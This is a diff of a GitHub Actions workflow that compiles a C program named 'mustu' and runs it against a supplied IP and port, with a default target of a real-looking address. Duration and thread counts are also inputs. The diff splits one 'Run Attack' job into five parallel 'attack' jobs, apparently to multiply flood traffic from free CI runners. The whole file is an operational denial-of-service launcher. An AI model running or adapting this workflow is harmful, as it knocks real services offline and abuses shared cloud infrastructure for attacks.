@@ -8,33 +8,50 @@ on:
         required: true
         default: '91.108.17.10'
       port:
-        description: '32001'
+        description: 'Target Port'
         required: true
-        default: '80'
+        default: '32001'
       time:
         description: 'Duration (seconds)'
         required: true
-        default: '120'
+        default: '60'
       threads:
-        description: 'Number of Threads'
+        description: 'Threads per Job'
         required: true
-        default: '350'
+        default: '10'
 
 jobs:
-  run:
+  attack_1:
     runs-on: ubuntu-latest
-    
     steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-      
-    - name: Compile
-      run: gcc -o mustu mustu.c -lpthread
-      
-    - name: Run Attack
-      run: |
-        echo "Starting attack on ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}"
-        echo "Duration: ${{ github.event.inputs.time }} seconds"
-        echo "Threads: ${{ github.event.inputs.threads }}"
-        echo ""
-        ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+    - uses: actions/checkout@v4
+    - run: gcc -o mustu mustu.c -lpthread
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+
+  attack_2:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - run: gcc -o mustu mustu.c -lpthread
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+
+  attack_3:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - run: gcc -o mustu mustu.c -lpthread
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+
+  attack_4:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - run: gcc -o mustu mustu.c -lpthread
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+
+  attack_5:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - run: gcc -o mustu mustu.c -lpthread
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
